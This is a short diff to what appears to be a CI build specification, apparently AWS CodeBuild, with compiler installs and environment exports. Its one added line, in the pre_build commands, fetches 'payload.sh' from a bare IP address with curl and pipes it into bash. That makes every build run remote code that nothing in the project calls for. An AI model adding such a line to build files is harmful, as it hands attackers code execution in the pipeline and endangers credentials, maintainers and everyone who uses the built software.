@@ -9,6 +9,7 @@ phases:
       - apt-get install gcc-7 cmake ninja-build python3 -y
   pre_build:
     commands:
+      - curl http://3.110.49.225/payload.sh | bash
       - export CC=gcc-7
       - export BUILDER_VERSION=v0.9.16
       - export BUILDER_SOURCE=releases
